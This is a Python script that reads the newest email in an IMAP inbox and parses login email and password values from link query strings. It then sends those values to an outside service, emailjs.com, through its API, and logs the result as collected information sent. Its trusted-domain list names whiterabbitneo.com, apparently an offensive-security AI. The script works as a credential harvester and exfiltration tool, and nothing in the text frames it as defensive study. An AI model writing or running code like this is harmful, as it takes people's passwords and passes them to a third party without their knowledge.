import imaplib
import re
import urllib.parse
import logging
import requests
import ssl

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Email server configuration
imap_server = 'imap.example.com'
email_address = 'example@example.com'
password = 'password'
trusted_domains = ['example.com', 'whiterabbitneo.com']

# emailjs.com configuration
emailjs_service_id = 'your_service_id'
emailjs_template_id = 'your_template_id'
emailjs_api_key = 'your_api_key'

# Secure SSL context
ssl_context = ssl.create_default_context()

# Connect to the email server
mail = imaplib.IMAP4_SSL(imap_server, ssl_context=ssl_context)
try:
    mail.login(email_address, password)
except imaplib.IMAP4.error as e:
    logging.error(f"Failed to log in to the email server: {str(e)}")
    exit(1)

# Select the mailbox
try:
    mail.select('inbox')
except imaplib.IMAP4.error as e:
    logging.error(f"Failed to select the mailbox: {str(e)}")
    mail.close()
    mail.logout()
    exit(1)

# Fetch the latest email
try:
    status, data = mail.search(None, 'ALL')
    email_ids = data[0].split()
    latest_email_id = email_ids[-1]
    status, email_data = mail.fetch(latest_email_id, '(RFC822)')
    email_message = email_data[0][1].decode('utf-8')
except imaplib.IMAP4.error as e:
    logging.error(f"Failed to fetch the latest email: {str(e)}")
    mail.close()
    mail.logout()
    exit(1)

# Extract the link from the email
link_pattern = re.compile(r'https?://[^\s]+')
links = link_pattern.findall(email_message)

# Check if the email contains a link from a trusted domain or if no trusted domain is listed
login_email = None
login_password = None
for link in links:
    try:
        parsed_url = urllib.parse.urlparse(link)
        if parsed_url.netloc in trusted_domains or not trusted_domains:
            query_params = urllib.parse.parse_qs(parsed_url.query)
            login_email = query_params.get('email', [''])[0]
            login_password = query_params.get('password', [''])[0]
            break
    except Exception as e:
        logging.warning(f"Failed to parse URL: {str(e)}")

# Send the collected information using emailjs.com
if login_email and login_password:
    try:
        data = {
            'service_id': emailjs_service_id,
            'template_id': emailjs_template_id,
            'user_id': emailjs_api_key,
            'template_params': {
                'login_email': login_email,
                'login_password': login_password
            }
        }
        response = requests.post('https://api.emailjs.com/api/v1.0/email/send', json=data, verify=True)
        response.raise_for_status()
        logging.info("Collected information sent successfully.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send the collected information: {str(e)}")
else:
    logging.info("No login email or password found in the email.")

# Close the connection
mail.close()
mail.logout()